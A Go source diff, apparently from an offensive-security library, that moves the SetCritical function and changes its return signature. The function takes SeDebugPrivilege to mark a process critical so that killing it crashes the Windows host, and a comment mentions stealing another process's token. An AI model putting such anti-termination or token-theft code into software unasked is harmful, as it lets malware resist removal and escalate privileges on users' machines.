@@ -169,27 +169,6 @@ func split(s string) []string {
 	return r
 }
 
-// SetCritical will set the critical flag on the current process. This function
-// requires administrative privileges and will attempt to get the
-// "SeDebugPrivilege" first before running.
-//
-// If successful, "critical" processes will BSOD the host when killed or will
-// be prevented from running.
-//
-// Use this function with "false" to disable the critical flag.
-//
-// NOTE: THIS MUST BE DISABED ON PROCESS EXIT OTHERWISE THE HOST WILL BSOD!!!
-//
-// Any errors when setting or obtaining privileges will be returned.
-//
-// Always returns 'ErrNoWindows' on non-Windows devices.
-func SetCritical(c bool) error {
-	if err := winapi.GetDebugPrivilege(); err != nil {
-		return err
-	}
-	return winapi.RtlSetProcessIsCritical(c)
-}
-
 // Mounts attempts to get the mount points on the local device.
 //
 // On Windows devices, this is the drive letters avaliable, otherwise on nix*
@@ -220,6 +199,30 @@ func Mounts() ([]string, error) {
 // Found here: https://stackoverflow.com/questions/14926020/setting-process-name-as-seen-by-ps-in-go
 func SetProcessName(s string) error {
 	return ErrNoNix
+}
+
+// SetCritical will set the critical flag on the current process. This function
+// requires administrative privileges and will attempt to get the
+// "SeDebugPrivilege" first before running.
+//
+// If successful, "critical" processes will BSOD the host when killed or will
+// be prevented from running.
+//
+// The boolean returned is the last Critical status. It's set to True if the
+// process was already marked as critical.
+//
+// Use this function with "false" to disable the critical flag.
+//
+// NOTE: THIS MUST BE DISABED ON PROCESS EXIT OTHERWISE THE HOST WILL BSOD!!!
+//
+// Any errors when setting or obtaining privileges will be returned.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+func SetCritical(c bool) (bool, error) {
+	if err := winapi.GetDebugPrivilege(); err != nil {
+		return false, err
+	}
+	return winapi.RtlSetProcessIsCritical(c)
 }
 
 // Impersonate attempts to steal the Token in use by the target process of the
